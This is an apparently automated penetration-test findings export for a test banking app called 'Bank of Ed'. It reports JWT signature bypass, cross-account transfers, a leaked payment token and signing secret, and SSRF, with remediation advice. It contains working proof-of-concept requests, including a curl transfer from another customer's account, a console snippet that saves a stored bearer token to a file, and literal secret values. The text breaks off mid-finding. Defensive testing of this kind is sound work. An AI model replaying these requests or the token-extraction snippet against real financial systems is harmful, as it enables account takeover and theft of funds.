# Issue Export: TAC1

- Site: Bank of Ed
- Exported: 27/09/2026, 12:32:18
- Total findings: 59

<!-- aespa-findings-json
%5B%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Customer%20authentication%20accepts%20JWTs%20with%20invalid%20signatures%22%2C%22description%22%3A%22The%20authentication%20middleware%20accepts%20attacker-controlled%20JWT%20claims%20without%20verifying%20the%20token%20signature.%20A%20JWT%20signed%20with%20an%20incorrect%20secret%20was%20accepted%20by%20the%20protected%20customer%20profile%20endpoint%20as%20belonging%20to%20customer%20ID%202.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20could%20impersonate%20customers%20whose%20numeric%20IDs%20are%20known%20or%20guessed%2C%20exposing%20protected%20banking%20data%20and%20allowing%20access%20to%20operations%20available%20to%20those%20customers.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20only%20a%20crafted%20three-part%20JWT%20containing%20a%20chosen%20customer%20ID%20in%20the%20sub%20claim%2C%20a%20future%20expiration%20time%2C%20and%20an%20unused%20token%20identifier.%20The%20observed%20endpoint%20accepted%20such%20a%20token%20despite%20its%20invalid%20signature.%22%2C%22recommendation%22%3A%22Use%20a%20maintained%20JWT%20library%20to%20verify%20every%20token's%20signature%20and%20restrict%20accepted%20algorithms%20before%20reading%20or%20trusting%20claims.%20Validate%20the%20issuer%2C%20audience%2C%20expiration%2C%20and%20token%20identifier%20as%20applicable.%20Rotate%20the%20signing%20keys%20and%20invalidate%20existing%20tokens%20after%20deploying%20the%20fix.%22%2C%22cvss_score%22%3A9.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%22%2C%22evidence%22%3A%22A%20JWT%20containing%20%7B%5C%22sub%5C%22%3A2%2C%5C%22jti%5C%22%3A%5C%22aespa-invalidsig-20260908%5C%22%2C%5C%22exp%5C%22%3A9999999999%7D%20was%20signed%20with%20the%20deliberately%20incorrect%20secret%20%5C%22aespa-deliberately-wrong-secret%5C%22.%20GET%20%2Fapi%2Fprofile%20accepted%20the%20token%20and%20returned%20HTTP%20200%20with%20the%20profile%20for%20customer%20ID%202%2C%20including%20wei.zhang%40example.com.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fprofile%20using%20session%20invalid_sig_user2%2C%20which%20contains%20an%20HS256%20token%20signed%20with%20a%20deliberately%20incorrect%20secret.%22%2C%22response_evidence%22%3A%22HTTP%20200%3A%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22id%5C%22%3A2%2C%5C%22email%5C%22%3A%5C%22wei.zhang%40example.com%5C%22%2C%5C%22first_name%5C%22%3A%5C%22Wei%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Zhang%5C%22%2C...%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22A%20cookie-free%20anonymous%20request%20returned%20401%2C%20so%20the%20profile%20endpoint%20is%20protected%20rather%20than%20intentionally%20public.%20The%20supplied%20invalid-signature%20session%20returned%20customer%202's%20profile%2C%20and%20an%20independent%20unsigned%20alg%3Dnone%20JWT%20with%20attacker-controlled%20sub%3D2%20also%20returned%20the%20same%20sensitive%20profile%20with%20no%20cookies.%20These%20controls%20rule%20out%20ambient%20authentication%20and%20show%20that%20the%20middleware%20trusts%20JWT%20claims%20without%20enforcing%20a%20valid%20signature.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22External%20transfer%20endpoint%20allows%20unauthorized%20debits%20from%20other%20customers'%20accounts%22%2C%22description%22%3A%22The%20external%20transfer%20endpoint%20accepts%20a%20user-controlled%20from_account_id%20without%20verifying%20that%20the%20account%20belongs%20to%20the%20authenticated%20customer.%20This%20allows%20a%20customer%20to%20initiate%20transfers%20from%20another%20customer's%20account.%22%2C%22impact%22%3A%22Any%20authenticated%20customer%20could%20transfer%20funds%20from%20other%20customers'%20accounts%20to%20an%20account%20they%20control%2C%20resulting%20in%20unauthorized%20transactions%20and%20financial%20loss.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20one%20authenticated%20request.%20Account%20IDs%20are%20sequential%20and%20exposed%20elsewhere%20in%20the%20application%2C%20making%20valid%20source%20accounts%20easy%20to%20identify.%22%2C%22recommendation%22%3A%22Query%20the%20source%20account%20using%20both%20its%20ID%20and%20the%20authenticated%20user's%20ID%2C%20and%20reject%20the%20request%20if%20no%20owned%20account%20is%20found.%20Repeat%20the%20ownership%20check%20inside%20the%20atomic%20transfer%20service%20before%20changing%20balances.%20Add%20authorization%20tests%20covering%20attempts%20to%20transfer%20from%20accounts%20owned%20by%20other%20users.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%22%2C%22evidence%22%3A%22While%20authenticated%20as%20Amelia%2C%20a%20request%20used%20Zoe's%20account%20ID%206%20as%20from_account_id%20and%20Amelia's%20account%20number%20as%20the%20destination.%20The%20endpoint%20returned%20HTTP%20201%20with%20transaction%20ID%2039%20and%20status%20completed.%20The%20response%20reported%20a%20new%20source%20balance%20of%201875.20%2C%20compared%20with%20Zoe's%20authorized%20baseline%20balance%20of%201875.21%2C%20confirming%20that%20Amelia's%20session%20debited%20Zoe's%20account%20by%200.01.%22%2C%22request_evidence%22%3A%22Authenticated%20as%20amelia.chen%40example.com%3A%20POST%20%2Fapi%2Ftransfers%2Fexternal%20body%20%7B%5C%22from_account_id%5C%22%3A6%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22AESPA%20ownership%20test%5C%22%7D.%22%2C%22response_evidence%22%3A%22HTTP%20201%3A%20%7B%5C%22transaction_id%5C%22%3A39%2C%5C%22from_account_id%5C%22%3A6%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22new_from_balance%5C%22%3A%5C%221875.20%5C%22%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%7D.%20Zoe's%20authorized%20baseline%20GET%20%2Fapi%2Faccounts%2F6%20showed%20balance%201875.21.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20tested%20the%20session-confusion%20and%20legitimate-ownership%20explanations%20with%20a%20separate%20authenticated%20customer.%20The%20weak_test%20session%20resolves%20to%20user%20ID%2017%20and%20its%20authenticated%20account%20list%20is%20empty%2C%20while%20Zoe's%20session%20shows%20that%20account%206%20belongs%20to%20Zoe.%20Despite%20that%2C%20weak_test%20successfully%20POSTed%20a%20one-cent%20transfer%20from%20account%206%2C%20received%20HTTP%20201%20with%20status%20completed%2C%20and%20reduced%20the%20reported%20source%20balance%20from%201875.20%20to%201875.19.%20This%20independently%20reproduces%20the%20missing%20ownership%20check%20with%20a%20clearly%20different%20non-admin%20customer%20session.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22from_account_id%5C%22%3A6%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000002%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Zoe%20Williams%5C%22%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22authorization%20validation%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**weak_test**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20weak_test%20customer%20and%20copy%20its%20bearer%20token%20from%20the%20Authorization%20request%20header.%20This%20customer%20should%20have%20no%20accounts.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Published%20fallback%20token%20authorizes%20payment%20transfers%22%2C%22description%22%3A%22The%20payment%20transfer%20endpoint%20accepts%20a%20publicly%20available%20fallback%20machine%20token%20as%20authorization%20to%20transfer%20funds%20from%20the%20seeded%20FACE%20Insurance%20settlement%20account.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20with%20the%20published%20token%20can%20transfer%20funds%20from%20the%20merchant%20settlement%20account%20to%20arbitrary%20internal%20or%20external%20accounts.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20only%20a%20network%20request%20using%20the%20published%20static%20token.%20The%20deployed%20endpoint%20accepted%20the%20token%20and%20completed%20a%20transfer%20without%20separate%20user%20authentication%20or%20approval.%22%2C%22recommendation%22%3A%22Immediately%20revoke%20and%20rotate%20the%20exposed%20token.%20Remove%20fallback%20credentials%20from%20published%20content%20and%20deployed%20code%2C%20and%20fail%20closed%20when%20required%20deployment%20secrets%20are%20missing.%20Issue%20narrowly%20scoped%20machine%20credentials%20that%20restrict%20permitted%20requests%2C%20source%20accounts%2C%20destinations%2C%20and%20transaction%20limits.%20Review%20transfer%20logs%20for%20unauthorized%20activity%20associated%20with%20this%20token.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fpayments%2Ftransfer%22%2C%22evidence%22%3A%22An%20anonymous%20request%20used%20Bearer%20mch_face_insurance_secret_key_2026%20to%20transfer%20AUD%200.01%20from%20seeded%20account%20062-001%2F88880001%20to%20controlled%20account%20062-001%2F10000001.%20The%20endpoint%20returned%20HTTP%20200%20with%20status%20%5C%22success%5C%22%2C%20receipt%20REC-BOE-20260908-825C78E6%2C%20and%20transaction_id%2042.%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fpayments%2Ftransfer%20with%20the%20published%20bearer%20token%20and%20body%20selecting%20the%20seeded%20FACE%20Insurance%20account%2C%20controlled%20destination%2C%20and%20amount%200.01.%22%2C%22response_evidence%22%3A%22HTTP%20200%3A%20%7B%5C%22status%5C%22%3A%5C%22success%5C%22%2C%5C%22receipt_number%5C%22%3A%5C%22REC-BOE-20260908-825C78E6%5C%22%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22from_account_number%5C%22%3A%5C%2288880001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22transaction_id%5C%22%3A42%7D.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22A%20cookie-free%20request%20with%20no%20token%20returned%20401%2C%20and%20a%20random%20bearer%20token%20also%20returned%20401%2C%20so%20the%20endpoint%20is%20not%20intentionally%20public.%20The%20reported%20fallback%20token%20was%20accepted%20in%20the%20same%20anonymous%20context%2C%20advanced%20an%20empty%20request%20to%20field%20validation%2C%20and%20then%20completed%20a%20real%20AUD%200.01%20transfer%20from%20062-001%2F88880001%20to%20062-001%2F10000001%20with%20receipt%20REC-BOE-20260908-DC15DD18%20and%20transaction%20ID%2043.%20This%20rules%20out%20carried%20session%20state%2C%20a%20generic%20200%20response%2C%20and%20acceptance%20of%20arbitrary%20bearer%20values.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Unauthenticated%20health%20endpoint%20exposes%20JWT%20signing%20secret%22%2C%22description%22%3A%22The%20unauthenticated%20health%20endpoint%20at%20%2Fapi%2Fhealth%20discloses%20the%20application's%20JWT%20signing%20secret%2C%20database%20connection%20details%2C%20runtime%20versions%2C%20and%20production%20environment%20name.%22%2C%22impact%22%3A%22An%20attacker%20could%20use%20the%20exposed%20signing%20secret%20to%20forge%20customer%20JWTs%20where%20that%20secret%20is%20used%20for%20signature%20verification%2C%20potentially%20enabling%20customer%20impersonation.%20The%20database%20and%20server%20details%20also%20provide%20information%20that%20could%20assist%20further%20attacks.%22%2C%22likelihood%22%3A%22The%20information%20is%20exposed%20through%20a%20single%20unauthenticated%20GET%20request.%20No%20user%20interaction%20or%20prior%20access%20is%20required.%22%2C%22recommendation%22%3A%22Return%20only%20a%20minimal%20health%20status%20from%20the%20public%20endpoint.%20Move%20detailed%20diagnostics%20behind%20operator%20authentication%20or%20network%20access%20controls.%20Rotate%20the%20exposed%20JWT%20signing%20secret%20immediately%2C%20invalidate%20tokens%20signed%20with%20the%20old%20secret%20where%20possible%2C%20and%20remove%20the%20development%20fallback%20secret%20from%20production%20configuration.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%22%2C%22evidence%22%3A%22An%20anonymous%20GET%20request%20received%20HTTP%20200%20with%20JSON%20containing%20the%20JWT%20secret%20%5C%22bankofed-dev-secret-change-in-production%5C%22%2C%20database%20host%20%5C%22127.0.0.1%5C%22%2C%20database%20name%20%5C%22bankofed%5C%22%2C%20database%20user%20%5C%22root%5C%22%2C%20PHP%20version%208.4.25%2C%20Apache%20version%202.4.68%2C%20and%20environment%20%5C%22production%5C%22.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fhealth%20with%20use_session%3Danonymous%20and%20no%20authentication.%22%2C%22response_evidence%22%3A%22HTTP%20200%3A%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.4.25%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%2F2.4.68%20(Unix)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22root%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22bankofed-dev-secret-change-in-production%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22A%20direct%20anonymous%20GET%20returned%20HTTP%20200%20and%20exposed%20the%20exact%20jwt_secret%20value%20plus%20db_host%2C%20db_name%2C%20and%20db_user%20in%20live%20JSON.%20This%20rules%20out%20the%20main%20benign%20explanations%20that%20the%20evidence%20came%20only%20from%20SAST%2C%20a%20protected%20debug%20page%2C%20or%20a%20generic%20health%20response.%20I%20also%20tried%20to%20locate%20a%20protected%20customer%20route%20for%20a%20forged-token%20disproof%2C%20but%20the%20supplied%20customer%20session%20was%20not%20injected%20and%20the%20guessed%20profile%20route%20did%20not%20exist%3B%20that%20does%20not%20change%20the%20independently%20confirmed%20unauthenticated%20secret%20disclosure.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fhealth%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Default%20administrator%20credentials%22%2C%22description%22%3A%22The%20administrator%20login%20accepted%20a%20predictable%20default%20username%20and%20password.%22%2C%22impact%22%3A%22An%20attacker%20can%20obtain%20administrator%20access%20to%20customer%20records%20and%20administrative%20functions.%22%2C%22likelihood%22%3A%22Directly%20exploitable%20using%20common%20default%20credentials%2C%20as%20confirmed%20by%20the%20successful%20login%20and%20subsequent%20authorized%20admin%20request.%22%2C%22recommendation%22%3A%22Remove%20default%20credentials%2C%20require%20a%20unique%20administrator%20password%20during%20setup%2C%20reset%20the%20exposed%20account%2C%20and%20add%20MFA%20and%20login%20rate%20limiting.%22%2C%22cvss_score%22%3A9.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%22%2C%22evidence%22%3A%22POST%20%2Fapi%2Fadmin%2Fauth%2Flogin%20with%20the%20default%20administrator%20credentials%20returned%20HTTP%20200%20and%20an%20administrator%20bearer%20token.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A06%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A06%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22unconfirmed%22%2C%22validation_note%22%3A%22The%20supplied%20evidence%20does%20not%20contain%20the%20claimed%20successful%20POST%3A%20it%20shows%20a%20GET%20that%20receives%20405%2C%20while%20the%20live%20POST%20requires%20username%20and%20password%20and%20rejects%20a%20deliberately%20invalid%20control%20with%20401.%20Repeating%20the%20empty%20POST%20with%20the%20listed%20admin%20session%20produces%20the%20same%20422%20as%20anonymous%2C%20so%20the%20stray%20Authorization%20header%20does%20not%20explain%20a%20login%20success.%20The%20exact%20default%20username%2Fpassword%20and%20the%20response%20from%20the%20claimed%20200%20POST%20are%20missing%2C%20so%20the%20finding%20cannot%20be%20confirmed%20or%20given%20a%20concrete%20benign%20explanation.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Shared%20default%20password%20across%20customer%20accounts%22%2C%22description%22%3A%22A%20customer%20account%20accepted%20the%20known%20default%20password%2C%20while%20the%20unauthenticated%20user%20export%20showed%20the%20same%20password%20hash%20for%20multiple%20customer%20accounts.%22%2C%22impact%22%3A%22An%20attacker%20can%20take%20over%20customer%20accounts%20and%20access%20or%20modify%20banking%20data.%22%2C%22likelihood%22%3A%22Highly%20likely%20because%20the%20default%20password%20successfully%20authenticated%20and%20the%20identical%20exported%20hashes%20indicate%20that%20it%20is%20shared%20across%20accounts.%22%2C%22recommendation%22%3A%22Assign%20unique%20random%20initial%20credentials%2C%20force%20password%20changes%2C%20block%20known%20default%20passwords%2C%20and%20reset%20all%20affected%20customer%20passwords.%22%2C%22cvss_score%22%3A9.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22Logging%20in%20as%20Zoe%20with%20the%20default%20password%20returned%20HTTP%20200.%20The%20user%20export%20showed%20the%20same%20password%20hash%20on%20several%20customer%20records.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A54%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A54%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20https%3A%2F%2Fevil.example%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22unconfirmed%22%2C%22validation_note%22%3A%22The%20evidence%20does%20not%20establish%20the%20finding.%20It%20contains%20no%20POST%20request%20or%20response%20showing%20that%20Zoe's%20credentials%20were%20accepted%2C%20and%20none%20of%20the%20supplied%20responses%20contains%20a%20user%20export%20or%20password%20hashes.%20The%20only%20authentication-related%20check%20shown%20for%20Zoe%20is%20a%20GET%20to%20%2Fapi%2Fauth%2Fme%20that%20returned%20a%20route-level%20404%2C%20while%20the%20login%20endpoint%20was%20tested%20with%20GET%20and%20correctly%20returned%20405%3B%20those%20requests%20do%20not%20prove%20or%20disprove%20password%20reuse.%20The%20admin%20customer%20responses%20also%20omit%20password%20fields%2C%20so%20the%20claimed%20shared%20hash%20cannot%20be%20verified%20from%20the%20available%20evidence.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A10%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Authenticated%20SSRF%20through%20profile%20avatar%20URL%20import%22%2C%22description%22%3A%22The%20profile%20avatar%20endpoint%20accepts%20an%20attacker-controlled%20URL%20in%20the%20JSON%20%60url%60%20field%2C%20fetches%20the%20resource%20from%20the%20application%20server%2C%20and%20returns%20its%20contents%20as%20a%20base64%20data%20URL.%20An%20authenticated%20request%20using%20%60https%3A%2F%2Fexample.com%60%20returned%20the%20Example%20Domain%20HTML%20in%20%60avatar_data%60%2C%20confirming%20server-side%20request%20forgery%20with%20response%20disclosure.%22%2C%22impact%22%3A%22An%20authenticated%20attacker%20can%20make%20the%20application%20server%20request%20attacker-chosen%20URLs%20and%20read%20the%20returned%20content.%20If%20reachable%20from%20the%20server%2C%20this%20could%20expose%20internal%20HTTP%20services%2C%20loopback-only%20endpoints%2C%20or%20cloud%20metadata%20services.%22%2C%22likelihood%22%3A%22High.%20Any%20authenticated%20user%20with%20access%20to%20the%20endpoint%20can%20supply%20a%20URL%20through%20the%20documented%20JSON%20field.%20The%20captured%20request%20confirmed%20that%20the%20server%20fetched%20and%20returned%20content%20from%20an%20external%20URL.%22%2C%22recommendation%22%3A%22Prefer%20direct%20file%20uploads%20for%20profile%20avatars.%20If%20URL%20imports%20are%20required%2C%20allow%20only%20approved%20HTTPS%20origins.%20Resolve%20hostnames%20and%20reject%20loopback%2C%20private%2C%20link-local%2C%20multicast%2C%20and%20reserved%20IPv4%20and%20IPv6%20addresses.%20Repeat%20these%20checks%20after%20every%20redirect%2C%20limit%20redirects%2C%20response%20sizes%2C%20and%20timeouts%2C%20and%20route%20requests%20through%20an%20isolated%20outbound%20proxy.%22%2C%22cvss_score%22%3A8.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%2Favatar%22%2C%22evidence%22%3A%22A%20POST%20request%20containing%20%60%7B%5C%22url%5C%22%3A%5C%22https%3A%2F%2Fexample.com%5C%22%7D%60%20returned%20HTTP%20200.%20The%20response%20reported%20%60source_url%60%20as%20%60https%3A%2F%2Fexample.com%60%2C%20a%2